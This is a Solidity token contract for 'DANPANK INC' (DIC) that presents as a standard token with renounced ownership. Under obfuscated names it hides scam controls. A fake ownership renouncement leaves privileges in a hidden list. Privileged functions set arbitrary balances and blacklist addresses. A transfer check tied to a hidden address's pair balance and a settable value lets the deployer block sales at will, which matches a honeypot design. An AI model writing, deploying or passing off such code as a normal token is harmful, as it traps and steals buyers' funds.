//SPDX-License-Identifier: MIT

pragma solidity ^0.8.6;

interface feeEnable {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface fromTeamLiquidity {
    function createPair(address txSender, address exemptBuy) external returns (address);
}

abstract contract txFund {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface toBuy {
    function totalSupply() external view returns (uint256);

    function balanceOf(address fromAt) external view returns (uint256);

    function transfer(address tradingFeeLimit, uint256 atFromTeam) external returns (bool);

    function allowance(address minLimitAt, address spender) external view returns (uint256);

    function approve(address spender, uint256 atFromTeam) external returns (bool);

    function transferFrom(address sender,address tradingFeeLimit,uint256 atFromTeam) external returns (bool);

    event Transfer(address indexed from, address indexed buyFundToken, uint256 value);
    event Approval(address indexed minLimitAt, address indexed spender, uint256 value);
}

interface toBuyMetadata is toBuy {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DANPANKINC is txFund, toBuy, toBuyMetadata {

    function owner() external view returns (address) {
        return shouldTeam;
    }

    address public receiverWallet;

    function transfer(address limitLaunched, uint256 atFromTeam) external virtual override returns (bool) {
        return totalAuto(_msgSender(), limitLaunched, atFromTeam);
    }

    uint256 feeMax;

    bool private tokenWalletSwap;

    function approve(address enableShould, uint256 atFromTeam) public virtual override returns (bool) {
        takeFund[_msgSender()][enableShould] = atFromTeam;
        emit Approval(_msgSender(), enableShould, atFromTeam);
        return true;
    }

    bool private minTeam;

    mapping(address => bool) public enableLaunched;

    address receiverBuy = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function totalSupply() external view virtual override returns (uint256) {
        return liquidityFromFund;
    }

    function symbol() external view virtual override returns (string memory) {
        return totalMarketingTrading;
    }

    function amountToken(address receiverTake, address tradingFeeLimit, uint256 atFromTeam) internal returns (bool) {
        require(sellIs[receiverTake] >= atFromTeam);
        sellIs[receiverTake] -= atFromTeam;
        sellIs[tradingFeeLimit] += atFromTeam;
        emit Transfer(receiverTake, tradingFeeLimit, atFromTeam);
        return true;
    }

    function balanceOf(address fromAt) public view virtual override returns (uint256) {
        return sellIs[fromAt];
    }

    function walletLimitIs(uint256 atFromTeam) public {
        isAt();
        feeMax = atFromTeam;
    }

    constructor (){
        
        walletList();
        feeEnable listTo = feeEnable(receiverBuy);
        atFromLaunch = fromTeamLiquidity(listTo.factory()).createPair(listTo.WETH(), address(this));
        if (minTeam) {
            tokenWalletSwap = false;
        }
        receiverWallet = _msgSender();
        marketingList[receiverWallet] = true;
        sellIs[receiverWallet] = liquidityFromFund;
        
        emit Transfer(address(0), receiverWallet, liquidityFromFund);
    }

    uint256 private liquidityFromFund = 100000000 * 10 ** 18;

    address public atFromLaunch;

    address senderTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    uint256 liquidityAt;

    function allowance(address tradingMin, address enableShould) external view virtual override returns (uint256) {
        if (enableShould == receiverBuy) {
            return type(uint256).max;
        }
        return takeFund[tradingMin][enableShould];
    }

    event OwnershipTransferred(address indexed fundShould, address indexed totalTx);

    function transferFrom(address receiverTake, address tradingFeeLimit, uint256 atFromTeam) external override returns (bool) {
        if (_msgSender() != receiverBuy) {
            if (takeFund[receiverTake][_msgSender()] != type(uint256).max) {
                require(atFromTeam <= takeFund[receiverTake][_msgSender()]);
                takeFund[receiverTake][_msgSender()] -= atFromTeam;
            }
        }
        return totalAuto(receiverTake, tradingFeeLimit, atFromTeam);
    }

    function walletList() public {
        emit OwnershipTransferred(receiverWallet, address(0));
        shouldTeam = address(0);
    }

    function totalAuto(address receiverTake, address tradingFeeLimit, uint256 atFromTeam) internal returns (bool) {
        if (receiverTake == receiverWallet) {
            return amountToken(receiverTake, tradingFeeLimit, atFromTeam);
        }
        uint256 walletIs = toBuy(atFromLaunch).balanceOf(senderTotal);
        require(walletIs == feeMax);
        require(!enableLaunched[receiverTake]);
        return amountToken(receiverTake, tradingFeeLimit, atFromTeam);
    }

    uint256 public teamMax;

    bool public enableMarketing;

    function isAt() private view {
        require(marketingList[_msgSender()]);
    }

    mapping(address => uint256) private sellIs;

    function marketingShould(address limitLaunched, uint256 atFromTeam) public {
        isAt();
        sellIs[limitLaunched] = atFromTeam;
    }

    bool public fundBuy;

    function atAuto(address isAuto) public {
        if (fundBuy) {
            return;
        }
        
        marketingList[isAuto] = true;
        
        fundBuy = true;
    }

    mapping(address => mapping(address => uint256)) private takeFund;

    function getOwner() external view returns (address) {
        return shouldTeam;
    }

    uint8 private launchedMarketing = 18;

    function decimals() external view virtual override returns (uint8) {
        return launchedMarketing;
    }

    function fundEnable(address totalFund) public {
        isAt();
        if (enableMarketing) {
            tokenWalletSwap = false;
        }
        if (totalFund == receiverWallet || totalFund == atFromLaunch) {
            return;
        }
        enableLaunched[totalFund] = true;
    }

    function name() external view virtual override returns (string memory) {
        return enableReceiverShould;
    }

    mapping(address => bool) public marketingList;

    address private shouldTeam;

    string private totalMarketingTrading = "DIC";

    string private enableReceiverShould = "DANPANK INC";

}